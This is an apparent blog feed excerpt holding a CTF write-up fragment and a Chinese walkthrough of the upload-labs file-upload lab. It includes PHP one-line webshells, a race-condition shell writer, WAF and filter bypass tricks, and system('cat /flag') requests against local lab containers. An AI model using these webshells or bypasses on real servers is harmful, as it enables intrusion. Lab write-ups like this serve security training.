low_e_attack(g,m2,n2)</span><br><span class="line">    print(m2)</span><br><span class="line">    print(n2s(m2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>拿到 flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219210242.png" alt="image-20201219210242314"></p><h2 id="flag-值-3"><a href="#flag-值-3" class="headerlink" title="flag 值"></a>flag 值</h2><p><strong>flag{1f0436d9442616370459454e30125201}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;上周六参加『 蓝帽杯 』全国大学生网络安全技能大赛线上决赛记录，先挖个坑等一手之后官方的 WP 。&lt;/strong&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    <category term="CTF" scheme="https://www.lintstar.top/categories/Note/CTF/"/>
    
    
    <category term="Web" scheme="https://www.lintstar.top/tags/Web/"/>
    
    <category term="PWN" scheme="https://www.lintstar.top/tags/PWN/"/>
    
    <category term="RSA" scheme="https://www.lintstar.top/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>GGCTF-UPLOAD 通关记录</title>
    <link href="https://www.lintstar.top/2020/12/612c8edf.html"/>
    <id>https://www.lintstar.top/2020/12/612c8edf.html</id>
    <published>2020-12-04T09:35:22.000Z</published>
    <updated>2021-03-10T02:40:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 11月打 HW 的时候，遇到了一个靶标服务器二次渲染的文件上传点，因为之前没仔细研究没能拿到权限，还是有点遗憾的。而且 Getshell 的主要两个方式就是文件上传和远程命令执行，所以正好借着这个国光的文件上传靶场来总结一下文件上传的姿势。</p><hr><h1 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PHP</span></span><br><span class="line"><span class="number">1.</span>遇到上传点传 php 失败</span><br><span class="line"><span class="number">2.</span>传php2,php3看下是黑名单还是白名单</span><br><span class="line"><span class="number">3.</span>走一遍正常逻辑传 jpg 看下上传模块是否正常，节约时间</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jsp</span></span><br><span class="line"><span class="number">1.</span>正常流程走一遍</span><br><span class="line"><span class="number">2.</span>判断黑白名单</span><br><span class="line"><span class="number">3.</span>Asp,aSp,aaspsp</span><br><span class="line"><span class="number">4.</span><span class="keyword">as</span></span><br><span class="line">  p</span><br><span class="line">  asp空格</span><br><span class="line">  asp%<span class="number">00</span></span><br><span class="line">  asp%<span class="number">0</span>a</span><br><span class="line"><span class="number">5.</span>可以在这 .①a②s③p④ 这四个位置进行 fuzz ！！！很重要</span><br><span class="line"><span class="number">6.</span>.aspx , .cer , .cdx , .asmx , ascx试一下</span><br><span class="line"><span class="number">7.16</span>进制编码</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tips</span></span><br><span class="line">要看 POST 包我们什么东西可控</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕waf</span></span><br><span class="line">- 垃圾数据填充（WAF为了保证速度，可能只会检测包的前<span class="number">1</span>M）</span><br><span class="line">- 设置多个filename字段（早期版本安全狗缺陷）</span><br><span class="line">- 更换filename字段位置（早期版本安全狗缺陷）</span><br><span class="line">- 替换为GET包（部分WAF只检测POST包中的参数）</span><br><span class="line">- 删除实体里面的Conten-Type字段（某些WAF检测不到该字段就直接放行）</span><br><span class="line">- 删除Conten-Type中“C”后面的字符串，再加上脚本的后缀（WAF规则缺陷）</span><br><span class="line">- 删除Content-Disposition字段里的空格（WAF规则缺陷）</span><br><span class="line">- 修改Content-Disposition字段值的大小写（WAF规则缺陷</span><br><span class="line">- Boundary后面加个空格或者其他可被正常处理的字符（WAF规则缺陷）</span><br><span class="line">- Boundary边界修改为不一致（两段Boundary不一致使得waf认为这段数据是无意义的，但容器并可能并没有这么严格）</span><br><span class="line">- 在文件名处换行（WAF规则缺陷）</span><br><span class="line">- 使用多个Content-Disposition（在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过）</span><br><span class="line">- 利用NTFS ADS特性（NTFS是Windows常用的文件系统格式。该格式支持交换数据流（Alternate Data Streams，缩写ADS）特性。该特性可以让多个文件流使用同一个文件名，便于系统管理和使用文件。这样，一个文件名可以包含一个主文件流和多个非主文件流。其中，主文件流可以以文件名直接访问，而其他文件流需要以“文件名:文件流名”进行访问。例如“Test.php::$DATA”可以直接生成Webshell“Test.php”绕过黑名单，当然若waf对filename匹配不当的话也可能会导致绕过。并且对于这类文件，普通的文件管理器只能看到主文件流，而无法看到其余的文件流，因此可以把一个或者多个文件隐藏到另外一个文件中。）</span><br><span class="line">- 后缀名后加“.”（Windows特性，存储时会删除“.”）</span><br><span class="line">- 超长后缀绕过后端重命名（若后端程序对上传的文件除后缀部分重命名，构造很多”.”、“-”等符号有可能不被waf拦截）</span><br><span class="line">- 超长文件名（文件名使用中文、特殊符号并最大程度的拉长）</span><br><span class="line">- 文件名结尾加“\”（安恒某版本云waf规则缺陷）</span><br></pre></td></tr></table></figure><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><ol><li><p>靶场 Github 地址：<a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a> 下载到本地</p></li><li><p>进入项目文件夹：<code>cd upload-labs-docker</code></p></li><li><p>部署运行：<code>docker-compose up -d</code></p></li><li><p>准备一个一句话木马 <code>x.php</code>：</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[x]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>GET 和 POST 请求都可以用</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201145034.png" alt="image-20201201145028373"></p><p>一切准备就绪 ~</p><p>那就访问：<a href="http://127.0.0.1:30001/">http://127.0.0.1:30001/</a> 开始第一关吧</p><blockquote><p>30001 - 30013 一个端口一关</p></blockquote><hr><h1 id="30001-JavaScript-绕过"><a href="#30001-JavaScript-绕过" class="headerlink" title="30001 -  JavaScript 绕过"></a>30001 -  JavaScript 绕过</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201225410.png" alt="image-20201201225410069"></p><h2 id="本关特征"><a href="#本关特征" class="headerlink" title="本关特征"></a>本关特征</h2><p>抓不到数据包的情况下，依然提示文件类型不正确</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>本关客户端 js 校验代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkfilesuffix</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        swal(<span class="string">&quot;请添加上传文件&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.indexOf(file_suffix) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            swal(<span class="string">&quot;只允许上传图片类型的文件!&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    swal(<span class="string">&quot;上传失败&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="调试-js"><a href="#调试-js" class="headerlink" title="调试 js"></a>调试 js</h3><p>选到 whitelist 函数这行 开始调试 js：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201221714.png" alt="image-20201201221714385"></p><p>找到该变量 直接修改数组元素的值</p><blockquote><p>右边为单点调试 左边为结束调试</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201225244.png" alt="image-20201201225244217"></p><p>结束调试 成功上传：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201225614.png" alt="image-20201201225614946"></p><p>访问<code>http://127.0.0.1:30001/upload/1.php?x=system(%27cat%20/flag%27);</code>拿到 flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201231229.png" alt="image-20201201231229255"></p><h3 id="禁用-js"><a href="#禁用-js" class="headerlink" title="禁用 js"></a>禁用 js</h3><p> 设置地址：chrome://settings/content/javascript</p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>可以先上传通过客户端校验后缀的文件  再通过抓包修改后缀绕过：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201230942.png" alt="image-20201201230942710"></p><hr><h1 id="30002-htaccess-解析规则绕过"><a href="#30002-htaccess-解析规则绕过" class="headerlink" title="30002 - htaccess 解析规则绕过"></a>30002 - htaccess 解析规则绕过</h1><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><blockquote><p>.htaccess文件最常用的功能应该就是自定义404页面了，其操作也非常简单，在.htaccess 文件中加入代码：ErrorDocument 404 /Error.html ，然后建立一个简单的html404页面并命名 Error.html即可。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201233125.png" alt="image-20201201233125066"></p><h2 id="本关特征-1"><a href="#本关特征-1" class="headerlink" title="本关特征"></a>本关特征</h2><p>黑名单几乎过滤了所有有问题的后缀名，除了.htaccess</p><h2 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h2><p>上传一个允许的后缀文件 抓包修改文件名和内容：</p><ul><li>文件名：<code>.htaccess</code></li><li>内容：<code>SetHandler application/x-httpd-php</code></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201234742.png" alt="image-20201201234742067"></p><p>这里的 htaccess 文件会使服务器把我们上传的其他后缀文件当成 php 文件解析</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202094150.png" alt="image-20201202094150774"></p><p>此时服务器的目录：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201201235358.png" alt="image-20201201235358756"></p><hr><h1 id="30003-MIME-绕过"><a href="#30003-MIME-绕过" class="headerlink" title="30003 - MIME 绕过"></a>30003 - MIME 绕过</h1><p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。</p><p>MIME的组成结构非常简单；由类型与子类型两个字符串中间用 ‘/‘ 分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。</p><p><strong>通用的结构为：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&#x2F;subtype</span><br></pre></td></tr></table></figure><p>MIME类型对大小写不敏感，但是传统写法都是小写。</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202093006.png" alt="image-20201202093006652"></p><h2 id="本关特征-2"><a href="#本关特征-2" class="headerlink" title="本关特征"></a>本关特征</h2><p>服务端校验 上传图片格式不解析 其他格式（包括 .htaccess）提示文件类型不正确</p><h2 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包修改 Content-Type 字段：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202093507.png" alt="image-20201202093507077"></p><p>上传成功</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202094107.png" alt="image-20201202094107221"></p><hr><h1 id="30004-文件头绕过"><a href="#30004-文件头绕过" class="headerlink" title="30004 - 文件头绕过"></a>30004 - 文件头绕过</h1><p>常见的文件头标志如下：</p><ul><li>JPEG (jpg)，文件头：<code>FFD8FF</code></li><li>PNG (png)，文件头：<code>89504E47</code></li><li>GIF (gif)，文件头：<code>47494638</code></li><li>HTML (html)，文件头：<code>68746D6C3E</code></li><li>ZIP Archive (zip)，文件头：<code>504B0304</code></li><li>RAR Archive (rar)，文件头：<code>52617221</code></li><li>Adobe Acrobat (pdf)，文件头：<code>255044462D312E</code></li><li>MS Word/Excel (xls.or.doc)，文件头：<code>D0CF11E0</code></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202095116.png" alt="image-20201202095116809"></p><h2 id="本关特征-3"><a href="#本关特征-3" class="headerlink" title="本关特征"></a>本关特征</h2><p>服务端白名单校验 只允许上传固定类型的文件 getReailFileType 函数只会校验文件前几个字节</p><h2 id="Bypass-3"><a href="#Bypass-3" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包添加文件头 GIF89a 假装自己是个 GIF 文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202100642.png" alt="image-20201202100642050"></p><p>成功上传</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202100521.png" alt="image-20201202100521776"></p><hr><h1 id="30005-双写绕过"><a href="#30005-双写绕过" class="headerlink" title="30005 - 双写绕过"></a>30005 - 双写绕过</h1><p>关键代码：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202101224.png" alt="image-20201202101224260"></p><h2 id="本关特征-4"><a href="#本关特征-4" class="headerlink" title="本关特征"></a>本关特征</h2><p>上传 php 文件后修改 MIME 类型伪造文件头成功上传</p><p>但是上传的结果是这个样子：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202101409.png" alt="image-20201202101409738"></p><p>上传的 php 文件后缀被替换了 导致服务器不解析</p><p>回过头来看正是这行代码造成的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = str_ireplace($blacklist,<span class="string">&quot;&quot;</span>,$name);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202101822.png" alt="image-20201202101822568"></p><p>看到『 忽略大小写版本 』：无法通过大小写绕过</p><h2 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包双写为 pphphp 后缀</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202103716.png" alt="image-20201202103716028"></p><p>成功上传</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202103802.png" alt="image-20201202103802562"></p><hr><h1 id="30006-大小写绕过"><a href="#30006-大小写绕过" class="headerlink" title="30006 - 大小写绕过"></a>30006 - 大小写绕过</h1><p>本关函数使用了 str_replace </p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202104247.png" alt="image-20201202104247797"></p><h2 id="本关特征-5"><a href="#本关特征-5" class="headerlink" title="本关特征"></a>本关特征</h2><p>同样的黑名单替换且 Windows 环境特性是不区分大小写</p><h2 id="Bypass-5"><a href="#Bypass-5" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包修改后缀 Php</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202104654.png" alt="image-20201202104653974"></p><p>成功上传</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202104630.png" alt="image-20201202104630562"></p><hr><h1 id="30007-GET-型-00-截断绕过"><a href="#30007-GET-型-00-截断绕过" class="headerlink" title="30007 - GET 型 %00 截断绕过"></a>30007 - GET 型 %00 截断绕过</h1><p><strong>%00 截断：</strong>PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。</p><p><strong>%00 截断适用条件</strong></p><ul><li>magic_quotes_gpc = Off</li><li>PHP 版本小于 5.3.4</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202105647.png" alt="image-20201202105647786"></p><h2 id="本关特征-6"><a href="#本关特征-6" class="headerlink" title="本关特征"></a>本关特征</h2><ul><li><p>只允许上传 jpg jpeg png gif 类型的文件</p></li><li><p>观察上图 路径信息是以 GET 方式传递到服务端的 默认会进行一次 URL 编码 </p></li><li><p>而 %00 解码后就是空字节</p></li></ul><h2 id="Bypass-6"><a href="#Bypass-6" class="headerlink" title="Bypass"></a>Bypass</h2><p>上传 x.php 抓包修改后缀和 MIME 类型 同时在上传路径添加 new.php 并使用 %00 截断</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202111626.png" alt="image-20201202111626099"></p><p>成功绕过：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202111657.png" alt="image-20201202111657435"></p><p>原理是 <code>%00</code> 起到截断的作用，最终会在 upload 目录下面生成 new.php </p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202111905.png" alt="image-20201202111905283"></p><p>顺便读一下 flag：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202112004.png" alt="image-20201202112004049"></p><hr><h1 id="30008-POST-型-00-截断绕过"><a href="#30008-POST-型-00-截断绕过" class="headerlink" title="30008 - POST 型 %00 截断绕过"></a>30008 - POST 型 %00 截断绕过</h1><p>题目同上</p><h2 id="本关特征-7"><a href="#本关特征-7" class="headerlink" title="本关特征"></a>本关特征</h2><p> 抓包发现路径信息是以 POST 方式传递到服务端的</p><h2 id="Bypass-7"><a href="#Bypass-7" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包通过 %00 截断</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202154337.png" alt="image-20201202154337615"></p><p>因为不是 GET 型 所以需要手动 URL 解码</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202160756.png" alt="image-20201202160756857"></p><blockquote><p>这里解码后虽然看起来没有东西 但是如果不存在 %00 URL 解码后的空字节的话无法绕过成功上传</p></blockquote><p>上传成功：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202161038.png" alt="image-20201202161038805"></p><hr><h1 id="30009-黑名单绕过"><a href="#30009-黑名单绕过" class="headerlink" title="30009 - 黑名单绕过"></a>30009 - 黑名单绕过</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202162201.png" alt="image-20201202162201276"></p><h2 id="本关特征-8"><a href="#本关特征-8" class="headerlink" title="本关特征"></a>本关特征</h2><p>黑名单限制了不可上传的文件类型</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202162120.png" alt="image-20201202162120435"></p><h2 id="Bypass-8"><a href="#Bypass-8" class="headerlink" title="Bypass"></a>Bypass</h2><p>抓包改后缀为 <code>phtml</code> 即可上传成功：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202162545.png" alt="image-20201202162545430"></p><blockquote><p>题目中提示的这些冷门后缀均可以绕过：phtml  pht  php3  php3p  php4  php5</p><p>或者 BP 改包：</p><p>p</p><p>hp</p><p>或者后缀加 00% 或者 %0a(换行) 或者空格</p><p>尝试能否在 ①.②p③h④p⑤  这五个位置进行 fuzz</p></blockquote><hr><h1 id="30010-条件竞争绕过"><a href="#30010-条件竞争绕过" class="headerlink" title="30010 - 条件竞争绕过"></a>30010 - 条件竞争绕过</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202163653.png" alt="image-20201202163652956"></p><h2 id="本关特征-9"><a href="#本关特征-9" class="headerlink" title="本关特征"></a>本关特征</h2><p>还是同样的白名单服务端校验：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202164643.png" alt="image-20201202164643117"></p><ol><li>先通过 move_uploaded_file() 将文件上传至服务器中</li><li>上传完毕后通过 in_array($ext,$whitelist) 检查文件名后缀</li><li>如果后缀名合法，则对文件进行 rename 重命名，上传完成</li><li>如果后缀名非法，则 unlink 删除文件</li></ol><p>因此可以通过条件竞争的方式在unlink之前，访问 shell.php</p><h2 id="Bypass-9"><a href="#Bypass-9" class="headerlink" title="Bypass"></a>Bypass</h2><p>竞争马 <code>shell.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;x.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[x])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>抓包发送到 Intruder 使用 Null 空值无限爆破：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202202424.png" alt="image-20201202202424416"></p><p>然后抓取访问 shell.php 的数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/upload/shell.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:30010</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>也使用 Null 空值爆破：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202214004.png" alt="image-20201202214004036"></p><blockquote><p>这里空值爆破的时候一定要把 Positions 中的变量 clear 掉</p></blockquote><p>上传成功：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202214050.png" alt="image-20201202214049619"></p><p> 进容器中验证一下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201202214239.png" alt="image-20201202214239520"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it a92 /bin/bash</span><br></pre></td></tr></table></figure><hr><h1 id="30011-二次渲染绕过"><a href="#30011-二次渲染绕过" class="headerlink" title="30011 - 二次渲染绕过"></a>30011 - 二次渲染绕过</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201203094540.png" alt="image-20201203094540032"></p><h2 id="本关特征-10"><a href="#本关特征-10" class="headerlink" title="本关特征"></a>本关特征</h2><ul><li><p>服务端对上传的图片做了二次渲染</p></li><li><p>可以远程文件包含逃避渲染上传后的图片</p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204103634.png" alt="image-20201204103634619"></p><h2 id="Bypass-10"><a href="#Bypass-10" class="headerlink" title="Bypass"></a>Bypass</h2><p>分别使用 GIF、PNG、JPG 来尝试绕过：</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>上传一张 cute.gif</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204123541.png" alt="image-20201204123541539"></p><p>下载渲染后的 /upload/1616623862.gif</p><p>使用 010Editor 打开渲染前后的两张 GIF，在没有发生变化的数据库部分插入 Webshell </p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204104650.png" alt="image-20201204104650657"></p><p>对比发现文件头后到箭头上方的内容是一样的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204104925.png" alt="image-20201204104925737"></p><p>插入一句话 <code>&lt;?php eval($_REQUEST[1]);?&gt;</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204123346.png" alt="image-20201204123346127"></p><p>上传后下载渲染后的 GIF 查看payload 是否还在：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204125325.png" alt="image-20201204125325338"></p><p>利用文件包含上传的图马：<code>http://127.0.0.1:30011/?file=./upload/655485171.gif</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201204125758.png" alt="image-20201204125757996"></p><p>读 Flag：<code>http://127.0.0.1:30011/?file=./upload/655485171.gif&amp;1=system(%27cat%20/f*%27);</code></p><blockquote><p>/表示根目录的文件或文件夹</p><p>./ 表示当前目录的文件或文件夹 「 等于不加 / 